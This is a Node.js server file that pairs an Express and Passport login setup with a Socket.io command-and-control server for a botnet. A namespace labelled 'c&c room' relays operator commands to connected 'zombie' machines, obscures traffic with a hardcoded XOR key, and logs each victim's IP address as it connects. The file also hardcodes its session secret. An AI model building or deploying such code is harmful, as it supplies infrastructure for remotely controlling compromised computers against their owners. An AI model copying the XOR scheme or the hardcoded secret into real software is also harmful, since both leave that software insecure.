// server.js

// set up ======================================================================
// get all the tools we need
var express  = require('express');
var app      = express();
var port     = process.env.PORT || 8080;
var mongoose = require('mongoose');
var passport = require('passport');
var flash    = require('connect-flash');
var http = require('http').Server(app);

var morgan       = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser   = require('body-parser');
var session      = require('express-session');

var configDB = require('./config/database.js');

// configuration ===============================================================
mongoose.connect(configDB.url); // connect to our database

require('./config/passport')(passport); // pass passport for configuration

// set up our express application
app.use(morgan('dev')); // log every request to the console
app.use(cookieParser()); // read cookies (needed for auth)
app.use(bodyParser.json()); // get information from html forms
app.use(bodyParser.urlencoded({ extended: true }));

app.set('view engine', 'ejs'); // set up ejs for templating

// required for passport
app.use(session({
    secret: 'ilovescotchscotchyscotchscotch', // session secret
    resave: true,
    saveUninitialized: true
}));
app.use(passport.initialize());
app.use(passport.session()); // persistent login sessions
app.use(flash()); // use connect-flash for flash messages stored in session

// routes ======================================================================
require('./app/routes.js')(app, passport); // load our routes and pass in our app and fully configured passport

// launch ======================================================================
app.listen(port);


var io = require('socket.io')(http);



//start encryption xor

function encryptDecrypt(input) {
	var key = ['K', 'C', 'Q']; //Can be any chars, and any size array
	var output = [];
	
	for (var i = 0; i < input.length; i++) {
		var charCode = input.charCodeAt(i) ^ key[i % key.length].charCodeAt(0);
		output.push(String.fromCharCode(charCode));
	}
	return output.join("");
}




//c&c room
var nsp = io.of('/private');

nsp.on('connection', function(socket){


var clientIp = socket.request.connection.remoteAddress;
var clientIp = clientIp.slice(7);

console.log('someone connected');
nsp.emit('zombie name', clientIp);
nsp.emit('chat message', 'Hello everyone!');


socket.on( 'chat message', function( msg ){

nsp.emit( 'chat message', msg, socket.id ); // pass the socket.id so other client know who it's from

io.emit('jnkcyp', encryptDecrypt(msg));
});
});


io.on('connection', function(socket){
var clientIp = socket.request.connection.remoteAddress;
var clientIp = clientIp.slice(7);


var encryptIP = encryptDecrypt(clientIp);
var decryptIP = encryptDecrypt(encryptIP);

console.log("decrypted IP: " + decryptIP)

nsp.emit('zombiename', clientIp);
console.log('Socket ID: ', socket.id);

console.log('Zombie Connected: ' + clientIp);
socket.on('disconnect', function(){
console.log('Zombie Disconnected');

});




//decrypts bot message
socket.on('jnkcyp', function(msg){

var decrypted = encryptDecrypt(msg);
nsp.emit('chat message', decrypted);


 });
  });




http.listen(80, function(){
  console.log('listening on *:80');
});

console.log('The magic happens on port ' + port);
